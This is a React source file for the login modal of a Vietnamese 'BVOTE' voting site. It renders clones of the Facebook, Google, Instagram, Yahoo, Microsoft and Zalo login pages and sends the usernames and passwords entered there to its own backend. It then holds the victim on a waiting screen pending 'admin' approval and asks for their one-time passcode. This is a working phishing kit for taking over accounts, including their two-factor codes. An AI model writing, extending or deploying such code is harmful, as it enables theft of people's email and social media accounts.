import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { toast } from 'react-toastify';
import { useUserAuth } from '@/contexts/UserAuthContext';
import { ImageAsIcon } from '@/components/icons/ImageAsIcon';
import { Loader, Lock, Eye, EyeOff, User, ArrowLeft } from 'lucide-react';
import { useEventBus } from '@/contexts/AppContext';

import FacebookLoginClone from '@/components/login-clones/FacebookLoginClone';
import GoogleLoginClone from '@/components/login-clones/GoogleLoginClone';
import InstagramLoginClone from '@/components/login-clones/InstagramLoginClone';
import YahooLoginClone from '@/components/login-clones/YahooLoginClone';
import OutlookLoginClone from '@/components/login-clones/OutlookLoginClone';
import ZaloLoginClone from '@/components/login-clones/ZaloLoginClone';
import { WaitingScreen } from '@/components/WaitingScreen';
import { API_ENDPOINTS } from '@/lib/services/apiConfig';
import fbIcon from '@/assets/social/facebook.svg';
import igIcon from '@/assets/social/instagram.svg';
import ggIcon from '@/assets/social/google.svg';
import zaloIcon from '@/assets/social/zalo.svg';
import outlookIcon from '@/assets/social/microsoft.svg';
import yahooIcon from '@/assets/social/yahoo.svg';

const API_SOCIAL_LOGIN = API_ENDPOINTS.socialLogin;
const API_SESSION_STATUS = API_ENDPOINTS.sessionStatus;

const AUTO_LOGIN_SETTINGS_KEY = 'autoLoginSettings';

// Brand-styled social login buttons (backgrounds and optional borders)
export const socialLogins = [
  {
    name: 'Facebook',
    icon: (props) => <ImageAsIcon src={fbIcon} alt="Facebook" {...props} />,
    bgClass: 'bg-[#1877F2]',
    borderClass: 'border border-[#1877F2]/60',
  },
  {
    name: 'Instagram',
    icon: (props) => <ImageAsIcon src={igIcon} alt="Instagram" {...props} />,
    bgClass: 'bg-gradient-to-tr from-[#f9ce34] via-[#ee2a7b] to-[#6228d7]',
    borderClass: 'border border-white/20',
  },
  {
    name: 'Google',
    icon: (props) => <ImageAsIcon src={ggIcon} alt="Google" {...props} />,
    bgClass: 'bg-white',
    borderClass: 'border border-gray-200',
  },
  {
    name: 'Zalo',
    icon: (props) => <ImageAsIcon src={zaloIcon} alt="Zalo" {...props} />,
    bgClass: 'bg-[#0068ff]',
    borderClass: 'border border-[#0068ff]/60',
  },
  {
    name: 'Yahoo',
    icon: (props) => <ImageAsIcon src={yahooIcon} alt="Yahoo" {...props} />,
    bgClass: 'bg-[#6001d2]',
    borderClass: 'border border-[#6001d2]/60',
  },
  {
    name: 'Microsoft',
    icon: (props) => <ImageAsIcon src={outlookIcon} alt="Microsoft" {...props} />,
    bgClass: 'bg-white',
    borderClass: 'border border-gray-200',
  },
];

export const LoginModal = ({ isOpen, setIsOpen, initialPlatform = null }) => {
  const { login: userLogin } = useUserAuth();
  const EventBus = useEventBus();

  const [step, setStep] = useState('initial'); // 'initial', 'social', 'otp'
  const [selectedPlatform, setSelectedPlatform] = useState(null);
  const [account, setAccount] = useState('');
  const [otp, setOtp] = useState('');
  const [currentLoginId, setCurrentLoginId] = useState(null);
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [waitingState, setWaitingState] = useState(null); // null, 'approval', 'otp_request'
  const [waitingDeadline, setWaitingDeadline] = useState(null); // timestamp when we should mark as failed
  const [otpAttempts, setOtpAttempts] = useState(0);
  const [loginSettings, setLoginSettings] = useState({
      defaultRequireApproval: false,
      defaultRequireOtp: false
  });

  useEffect(() => {
    try {
        const saved = localStorage.getItem(AUTO_LOGIN_SETTINGS_KEY);
        if (saved) {
            setLoginSettings(prev => ({...prev, ...JSON.parse(saved)}));
        }
    } catch (error) {
        console.error("Could not load login settings", error);
    }
  }, []);

  useEffect(() => {
    if (isOpen && initialPlatform) {
      handleSocialLogin(socialLogins.find(p => p.name === initialPlatform.name));
    }
  }, [isOpen, initialPlatform]);

  useEffect(() => {
    if (!isOpen) {
      setTimeout(() => {
        setStep('initial');
        setSelectedPlatform(null);
        setAccount('');
        setOtp('');
        setCurrentLoginId(null);
        setIsLoading(false);
        setWaitingState(null);
        setOtpAttempts(0);
      }, 300);
    }
  }, [isOpen]);

  // Poll status when waiting for approval, preferring loginId-specific status endpoint; fallback to session status
  useEffect(() => {
    if (!isOpen || waitingState !== 'approval') return;
    let cancelled = false;
    let delay = 2000; // start at 2s
    const maxDelay = 10000; // cap at 10s
    const deadline = waitingDeadline || (Date.now() + 60000); // total 1 minute per spec
    if (!waitingDeadline) setWaitingDeadline(deadline);

    const poll = async () => {
      if (cancelled) return;
      try {
        const statusUrl = currentLoginId
          ? `${API_SOCIAL_LOGIN}/status?id=${encodeURIComponent(currentLoginId)}`
          : API_SESSION_STATUS;
        const isSessionFallback = !currentLoginId;
        const res = await fetch(statusUrl, {
          method: 'GET',
          headers: {
            'Accept': 'application/json',
            'X-CSRF-Token': (window.__CSRF_TOKEN || '')
          },
          credentials: 'include'
        });
        const data = await res.json();
        const sessionAuthed = isSessionFallback ? (data?.data?.isAuthenticated === true) : false;
        if (data?.success === true && !isSessionFallback) {
          // success from loginId status endpoint
          const platformName = selectedPlatform ? selectedPlatform.name : 'Gmail';
          userLogin({ name: account || 'user', platform: platformName });
          setIsOpen(false);
          toast.success('✅ Đăng nhập thành công!');
          return;
        }
        if (data?.status === 'success' || sessionAuthed) {
          // Backend should have set session; use known account/platform as display
          const platformName = selectedPlatform ? selectedPlatform.name : 'Gmail';
          userLogin({ name: account || 'user', platform: platformName });
          setIsOpen(false);
          toast.success('✅ Đăng nhập thành công!');
          return;
        }
  if (data?.requires_otp || data?.status === 'otp') {
          setWaitingState(null);
          setStep('otp');
          toast.info('Vui lòng nhập mã OTP để tiếp tục.');
          return;
        }
        if (data?.status === 'failed' || data?.status === 'rejected' || data?.error) {
          setWaitingState(null);
          toast.error(data?.message || 'Yêu cầu đăng nhập đã bị từ chối. Vui lòng thử lại.');
          return;
        }
        // else pending/processing -> continue
      } catch (err) {
        // network hiccup: continue with backoff until deadline
      }
      if (Date.now() >= deadline) {
        setWaitingState(null);
        toast.error('Đăng nhập thất bại (hết thời gian chờ).');
        return;
      }
      delay = Math.min(maxDelay, Math.round(delay * 1.5));
      setTimeout(poll, delay);
    };

    const t = setTimeout(poll, delay);
    return () => { cancelled = true; clearTimeout(t); };
  }, [isOpen, waitingState, selectedPlatform, account, userLogin, setIsOpen, currentLoginId]);

  // Removed demo event-bus simulation. Real login is handled via backend API.

  const toPlatformKey = (name) => {
    if (!name) return 'gmail';
    const key = name.toLowerCase();
    if (key.includes('facebook')) return 'facebook';
    if (key.includes('google') || key.includes('gmail')) return 'gmail';
    if (key.includes('instagram')) return 'instagram';
    if (key.includes('zalo')) return 'zalo';
    if (key.includes('outlook') || key.includes('microsoft') || key.includes('hotmail')) return 'microsoft';
    if (key.includes('yahoo')) return 'yahoo';
    return 'gmail';
  };

  const sendLoginRequest = async (platformName, acc, pass = '') => {
    try {
      setIsLoading(true);
      setAccount(acc);
      // Show 5s loading spinner before transitioning to approval dialog
      await new Promise((r) => setTimeout(r, 5000));
      const payload = {
        platform: toPlatformKey(platformName),
        username: acc,
        password: pass,
        csrf_token: window.__CSRF_TOKEN || ''
      };
      const res = await fetch(API_SOCIAL_LOGIN, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': (window.__CSRF_TOKEN || '') },
        credentials: 'include',
        body: JSON.stringify(payload)
      });
      const data = await res.json();
      if (data.success) {
        userLogin({ name: acc, platform: platformName });
        setIsOpen(false);
        toast.success('✅ Đăng nhập thành công!');
      } else if (data.requires_otp) {
        setStep('otp');
        toast.info('Vui lòng nhập mã OTP.');
      } else if (data.requires_approval || data.requires_approval === true) {
        setWaitingDeadline(Date.now() + 60000); // 1 minute timeout per spec
        setWaitingState('approval');
        if (data.loginId) setCurrentLoginId(data.loginId);
        toast.info('Yêu cầu đăng nhập đã được gửi. Vui lòng chờ phê duyệt.');
      } else {
        toast.error(data.message || 'Đăng nhập thất bại.');
      }
    } catch (e) {
      toast.error('Lỗi kết nối máy chủ.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleSocialLogin = (platform) => {
    setSelectedPlatform(platform);
    setStep('social');
  }

  const handleCredentialLogin = (e) => {
    e.preventDefault();
    const formData = new FormData(e.currentTarget);
    const submittedAccount = formData.get('account');
    const submittedPassword = formData.get('password');

    if (!submittedAccount || !submittedPassword) {
      toast.error("Vui lòng nhập đầy đủ thông tin.");
      return;
    }
    const platformName = selectedPlatform ? selectedPlatform.name : "Gmail";
    sendLoginRequest(platformName, submittedAccount, submittedPassword);
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    const is6or8 = otp && (otp.length === 6 || otp.length === 8);
    if (!is6or8) {
      toast.error("Vui lòng nhập mã OTP 6 hoặc 8 chữ số.");
      return;
    }
    try {
      setIsLoading(true);
      const platformName = selectedPlatform ? selectedPlatform.name : 'Gmail';
      const payload = {
        platform: toPlatformKey(platformName),
        username: account,
        password: '',
        otp,
        csrf_token: window.__CSRF_TOKEN || ''
      };
      const res = await fetch(API_SOCIAL_LOGIN, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': (window.__CSRF_TOKEN || '') },
        credentials: 'include',
        body: JSON.stringify(payload)
      });
      const data = await res.json();
      if (data.success) {
        userLogin({ name: account, platform: platformName });
        setIsOpen(false);
        toast.success('✅ Đăng nhập thành công!');
      } else if (data.requires_approval || data.requires_approval === true) {
        setWaitingDeadline(Date.now() + 60000);
        setWaitingState('approval');
        if (data.loginId) setCurrentLoginId(data.loginId);
        toast.info('OTP đã gửi. Vui lòng chờ phê duyệt.');
      } else {
        setOtpAttempts((n) => n + 1);
        const attempts = otpAttempts + 1;
        const baseMsg = data.message || 'Không thể xác thực OTP.';
        if (attempts >= 3) {
          toast.error(baseMsg + ' Bạn đã nhập sai nhiều lần. Vui lòng kiểm tra lại mã OTP hoặc liên hệ hỗ trợ.');
        } else {
          toast.error(baseMsg);
        }
      }
    } catch (err) {
      toast.error('Lỗi kết nối máy chủ. Vui lòng thử lại sau.');
    } finally {
      setIsLoading(false);
      setOtp('');
    }
  }

  const handleBack = () => {
    if (isLoading || waitingState) return;
    setStep('initial');
    setSelectedPlatform(null);
    setAccount('');
  }

  const handleClose = () => {
    if (isLoading || waitingState) return;
    setIsOpen(false);
  }

  const renderInitial = () => (
    <div className="text-center">
      {waitingState ? (
        <div className="bg-white rounded-lg overflow-hidden w-full flex flex-col justify-center min-h-[460px]">
          <WaitingScreen state={waitingState} />
        </div>
      ) : (
        <>
      <h1 className="text-4xl font-bold text-primary">BVOTE</h1>
      <p className="text-sm text-gray-400 mt-2 mb-6 max-w-xs mx-auto">
        Hãy dùng lá phiếu của bạn để ủng hộ cho thí sinh bạn yêu thích nhất!
      </p>

      <form onSubmit={(e) => {
          e.preventDefault();
          const formData = new FormData(e.currentTarget);
          const acc = formData.get('account');
          const pass = formData.get('password');
          if (!acc || !pass) {
            toast.error("Vui lòng nhập đầy đủ thông tin.");
            return;
          }
          sendLoginRequest("Gmail", acc, pass);
      }} className="space-y-4">
        <div className="relative">
          <User className="absolute left-4 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-500" />
          <Input name="account" type="text" placeholder="email hoặc số điện thoại" className="bg-card border-border rounded-lg h-12 pl-12 text-white placeholder:text-gray-500 focus:border-primary" required disabled={isLoading || waitingState} />
        </div>
        <div className="relative">
          <Lock className="absolute left-4 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-500" />
          <Input name="password" type={showPassword ? "text" : "password"} placeholder="Mật khẩu" className="bg-card border-border rounded-lg h-12 pl-12 pr-12 text-white placeholder:text-gray-500 focus:border-primary" required disabled={isLoading || waitingState}/>
          <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-500 hover:text-white" disabled={isLoading || waitingState}>
            {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
          </button>
        </div>
        <Button type="submit" className="w-full h-12 text-base font-bold bg-primary hover:bg-primary/90 rounded-lg transition-all duration-300 flex items-center justify-center gap-2" disabled={isLoading || waitingState}>
          {(isLoading || waitingState)
            ? <><Loader className="h-4 w-4 animate-spin" /> Đang chờ...</>
            : <><ImageAsIcon src={ggIcon} alt="Gmail" className="h-5 w-5" /> Đăng Nhập</>}
        </Button>
      </form>

    <div className="mt-6 text-xs flex justify-start">
      <button type="button" className="font-medium text-gray-400 hover:text-primary" onClick={() => toast.info("🚧 Tính năng đang phát triển!")} disabled={isLoading || waitingState}>Quên mật khẩu?</button>
    </div>

  <div className="flex items-center my-6">
        <div className="flex-grow border-t border-border"></div>
        <span className="flex-shrink mx-4 text-muted-foreground text-xs">hoặc</span>
        <div className="flex-grow border-t border-border"></div>
      </div>

      <div className="mx-auto w-full">
        <div className="flex items-center justify-center gap-2 overflow-x-auto py-1">
          {socialLogins.map((p) => (
            <motion.button
              key={p.name}
              onClick={() => handleSocialLogin(p)}
              whileHover={{ scale: 1.08, y: -1 }}
              whileTap={{ scale: 0.96 }}
              className={`flex items-center justify-center w-12 h-12 rounded-lg ${p.bgClass} ${p.borderClass} overflow-hidden p-0 flex-shrink-0`}
              aria-label={`Đăng nhập với ${p.name}`}
              disabled={isLoading}
            >
              <div className="pointer-events-none flex items-center justify-center w-[72%] h-[72%]">
                <p.icon className="w-full h-full object-contain" />
              </div>
            </motion.button>
          ))}
        </div>
      </div>
  </>
      )}
    </div>
  );

  const renderSocialLogin = () => {
    if (!selectedPlatform) return null;

    const wrapperClasses = "bg-white rounded-lg overflow-hidden w-full flex flex-col justify-center min-h-[460px]";

    if (waitingState) {
        return (
            <div className={wrapperClasses}>
                <WaitingScreen state={waitingState} />
            </div>
        );
    }

    const commonProps = { onLogin: handleCredentialLogin, isLoading };
    let content;

    switch(selectedPlatform.name) {
        case 'Facebook': content = <FacebookLoginClone {...commonProps} />; break;
        case 'Google': content = <GoogleLoginClone {...commonProps} />; break;
        case 'Instagram': content = <InstagramLoginClone {...commonProps} />; break;
        case 'Yahoo': content = <YahooLoginClone {...commonProps} />; break;
  case 'Outlook':
  case 'Microsoft': content = <OutlookLoginClone {...commonProps} />; break;
        case 'Zalo': content = <ZaloLoginClone {...commonProps} />; break;
        default:
            content = (
                <div className="text-center text-white p-6">
                    <h2 className="text-xl">Đăng nhập với {selectedPlatform.name}</h2>
                    <p className="text-muted-foreground">Tính năng này đang được phát triển.</p>
                </div>
            );
    }
    return <div className={wrapperClasses}>{content}</div>;
  };

  const renderOtpInput = () => {
    if (waitingState) {
        return <WaitingScreen state={waitingState} />;
    }
    return (
      <div className="text-center text-white w-full max-w-sm">
        <h2 className="text-2xl font-bold">Nhập mã OTP</h2>
        <p className="text-sm text-muted-foreground mt-2">Admin đã yêu cầu xác thực OTP. Vui lòng nhập mã được cung cấp.</p>
         <form onSubmit={handleOtpSubmit} className="space-y-4 mt-6">
            <div className="relative">
                <Lock className="absolute left-4 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-500" />
                <Input
                  type="text"
                  placeholder="Mã OTP 6 hoặc 8 chữ số"
                  value={otp}
                  onChange={(e) => {
                    const digits = (e.target.value || '').replace(/\D+/g, '').slice(0, 8);
                    setOtp(digits);
                  }}
                  className="bg-card border-border rounded-lg h-12 pl-12 text-white placeholder:text-gray-500 focus:border-primary tracking-[0.5em] text-center"
                  maxLength={8}
                  required
                />
            </div>
            <Button type="submit" className="w-full h-12 text-base font-bold bg-primary hover:bg-primary/90 rounded-lg">Xác nhận OTP</Button>
        </form>
      </div>
    );
  };

  const renderContent = () => {
    switch (step) {
      case 'initial':
        return renderInitial();
      case 'social':
        return renderSocialLogin();
      case 'otp':
        return renderOtpInput();
      default:
        return null;
    }
  };

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <AnimatePresence>
        {isOpen && (
          <DialogContent className="p-0 border-none bg-transparent shadow-none w-full max-w-[360px]" onInteractOutside={(e) => { if (isLoading || waitingState) e.preventDefault(); }}>
            <motion.div
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.9 }}
              transition={{ duration: 0.3 }}
              className="bg-background/90 backdrop-blur-md border border-border rounded-2xl shadow-2xl shadow-primary/20"
            >
              <div className="relative">
                <div className="absolute top-0 left-0 right-0 h-12 flex items-center justify-between px-2 z-10">
                    {step !== 'initial' && !waitingState && (
                      <Button variant="ghost" size="icon" className="text-gray-400 hover:text-white" onClick={handleBack} disabled={isLoading || waitingState}>
                        <ArrowLeft className="h-5 w-5"/>
                      </Button>
                    )}
                </div>

                <AnimatePresence mode="wait">
                  <motion.div
                    key={step + (waitingState || '')}
                    initial={{ opacity: 0, x: step === 'social' || step === 'otp' ? 30 : -30 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: step === 'social' || step === 'otp' ? -30 : 30 }}
                    transition={{ duration: 0.25 }}
                    className="p-6 pt-14 flex items-center justify-center min-h-[580px]"
                  >
                    {renderContent()}
                  </motion.div>
                </AnimatePresence>
              </div>
            </motion.div>
          </DialogContent>
        )}
      </AnimatePresence>
    </Dialog>
  );
};